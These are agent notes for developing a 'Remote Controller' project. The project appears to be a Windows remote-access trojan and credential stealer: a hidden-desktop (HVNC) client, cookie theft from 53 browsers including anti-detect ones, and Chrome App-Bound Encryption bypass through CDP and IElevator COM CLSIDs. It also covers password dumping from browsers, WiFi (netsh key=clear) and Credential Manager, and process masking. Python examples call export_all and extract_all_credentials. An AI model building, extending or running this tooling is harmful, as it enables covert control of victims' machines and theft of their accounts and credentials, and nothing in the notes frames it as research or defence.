# Remote Controller - Agent Notes

## Project Structure

- `client/` - Python client that runs on remote Windows machines
  - `remote_client/runtime.py` - Session resource builder
  - `remote_client/webrtc/client.py` - WebRTC client
  - `remote_client/windows/hvnc_track.py` - HVNC (Hidden VNC) video tracks
  - `remote_client/cookie_extractor/` - Cookie extraction from 50+ browsers
  - `remote_client/security/` - Firewall, anti-fraud, process masking
- `operator/` - Web UI for operators
  - `js/app_connection.js` - WebRTC connection handling
  - `js/app_core.js` - State and DOM management
- `operator_desktop/` - Desktop application for operators (PyQt)
- `server/` - FastAPI signaling server
- `password_extractor/` - Password extraction from browsers, WiFi, Windows Credentials

## Key Features

### Dual-Stream HVNC Mode

Support for simultaneous viewing of main desktop and HVNC hidden desktop:

1. **DualStreamSession** (hvnc_track.py) - Creates two video tracks:
   - `main_desktop` - Captures real desktop visible to user
   - `hvnc_desktop` - Captures hidden desktop created via CreateDesktop API

2. **Environment Variables**:
   - `RC_HVNC_DUAL_STREAM=1` (default) - Enable dual-stream mode
   - `RC_HVNC_DUAL_STREAM=0` - Use single-stream HVNC mode

3. **Operator UI View Modes**:
   - Main - Primary view shows main desktop
   - HVNC - Primary view shows HVNC desktop
   - Split - Side-by-side view of both streams
   - PiP - Main desktop with HVNC in picture-in-picture

### Cookie Extractor (53 browsers)

Supports Chromium and Firefox-based browsers:
- **Major**: Chrome, Edge, Brave, Opera, Vivaldi, Yandex, Arc
- **Anti-detect**: Dolphin Anty, Octo, AdsPower, GoLogin, Multilogin, Ghost Browser
- **Firefox-based**: Firefox, Waterfox, LibreWolf, Pale Moon, Tor Browser
- **Regional**: Coc Coc, 360 Browser, QQ Browser, UC Browser, Naver Whale

Chrome 127+ ABE (App-Bound Encryption) decryption:
- Primary method: CDP (Chrome DevTools Protocol)
- Fallback: IElevator COM interface
- Browser-specific elevation service CLSIDs supported

### Password Extractor

Comprehensive credential extraction:
- **Browser passwords**: 30+ Chromium and Firefox browsers
- **WiFi passwords**: via `netsh wlan show profiles key=clear`
- **Windows Credential Manager**: via CredEnumerate API

### IElevator COM Interface

Chrome's elevation service for ABE key decryption:
- CLSID Chrome Stable: `{708860E0-F641-4611-8895-7D867DD3675B}`
- CLSID Edge: `{1EBBCAB8-D9A8-4FBA-8BC2-7B7687B31B52}`
- CLSID Brave: `{576B31AF-6369-4B6B-8560-E4B203A97A8B}`
- IID IElevator: `{A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C}`

## Build Commands

```bash
# Install dependencies
pip install -r client/requirements-client.txt

# Run tests
pytest tests/

# Build client for Windows (on Windows)
cd client && build_windows.bat

# Run signaling server
cd server/app && python signaling_server.py
```

## API Usage Examples

```python
# Extract all browser cookies
from client.remote_client.cookie_extractor import CookieExporter
exporter = CookieExporter()
cookies = exporter.export_all()

# Extract all credentials
from password_extractor.extractor import extract_all_credentials, export_credentials_json
result = extract_all_credentials()
json_output = export_credentials_json(result)

# Get installed browsers
from password_extractor.extractor import get_installed_browsers
browsers = get_installed_browsers()  # ['chrome', 'edge', 'firefox', ...]

# Extract WiFi passwords
from password_extractor.extractor import extract_wifi_passwords
wifi = extract_wifi_passwords()  # List[WiFiPassword]
```

## Notes for Future Development

- Track IDs are used to distinguish streams: `main_desktop` vs `hvnc_desktop`
- Second video transceiver is only added when session mode is `hvnc`
- Dual-stream controls appear automatically when two video tracks are received
- CDP is preferred over IElevator for Chrome 127+ (more reliable)
- Firefox password decryption requires NSS library for full key4.db support
